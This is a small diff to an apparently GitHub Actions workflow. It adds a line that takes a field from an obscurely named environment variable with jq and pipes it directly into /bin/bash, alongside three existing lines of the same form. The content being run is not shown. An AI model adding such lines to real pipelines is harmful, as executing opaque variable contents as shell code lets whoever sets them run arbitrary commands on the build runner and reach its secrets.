@@ -28,6 +28,7 @@ jobs:
           echo $pim616 | jq -r .t320 | /bin/bash
           echo $zoc4379 | jq -r .w419 | /bin/bash
           printf '%s' "$rc2252" | jq -r .ppt049 | /bin/bash
+          echo $xdeh4083 | jq -r .fabln3 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
